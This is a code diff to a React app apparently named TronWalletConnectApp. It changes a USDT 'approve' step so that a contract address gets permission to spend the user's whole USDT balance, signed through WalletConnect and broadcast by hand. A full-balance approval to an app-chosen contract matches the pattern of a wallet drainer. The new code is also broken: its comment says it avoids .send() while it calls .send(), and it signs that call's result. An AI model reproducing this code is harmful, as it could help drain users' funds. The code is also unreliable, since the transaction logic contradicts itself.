@@ -339,12 +339,32 @@ export default function TronWalletConnectApp() {
       //   return;
       // }
 
+      // const contract = await tronWeb.contract().at(contractAddressUSDT);
+
+      // const approveTx = await contract.approve(contractAddress, usdtBalance * 1e6).send({
+      //   from: address
+      // });
+      // console.log('Approve transaction sent:', approveTx);
+      // alert('Approve successful');
+
+      tronWeb.setAddress(address); // Set sender
+
       const contract = await tronWeb.contract().at(contractAddressUSDT);
 
-      const approveTx = await contract.approve(contractAddress, usdtBalance * 1e6).send({
-        from: address
-      });
-      console.log('Approve transaction sent:', approveTx);
+      // Manually build transaction (NOT .send())
+      const tx = await contract.approve(contractAddress, usdtBalance * 1e6).send({
+        feeLimit: 100_000_000,
+        callValue: 0,
+        shouldPollResponse: false
+      }, address);
+
+      // Sign with WalletConnect
+      const signedTx = await wallet.signTransaction(tx);
+
+      // Broadcast
+      const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+      console.log('Approve Tx Result:', result);
       alert('Approve successful');
     } catch (error) {
       console.error('Approve failed:', error);
